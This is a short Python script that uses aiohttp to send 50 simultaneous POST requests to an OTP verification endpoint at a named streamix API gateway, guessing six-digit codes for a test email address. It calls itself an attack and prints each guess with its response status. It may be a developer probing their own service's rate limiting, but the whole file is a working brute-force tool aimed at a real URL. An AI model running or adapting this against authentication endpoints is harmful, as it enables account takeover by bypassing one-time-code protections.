import aiohttp
import asyncio

URL = "https://streamix-api-gateway.onrender.com/auth/verify"

# guess 50 random OTP codes instantly
PAYLOADS = [{"email": "test@streamix.com", "code": f"{100000 + i}"} for i in range(50)]

async def send_attack(session, payload):
    try:
        async with session.post(URL, json=payload) as response:
            status = response.status
            
            print(f"Guessed {payload['code']} -> Status: {status}")
    except Exception as e:
        print(f"Request failed: {e}")

async def blast_api():
    print(f"Launching 50 concurrent requests against \n{URL}...\n")
    # This fires all 50 requests at the exact same millisecond
    async with aiohttp.ClientSession() as session:
        tasks = [send_attack(session, payload) for payload in PAYLOADS]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(blast_api())
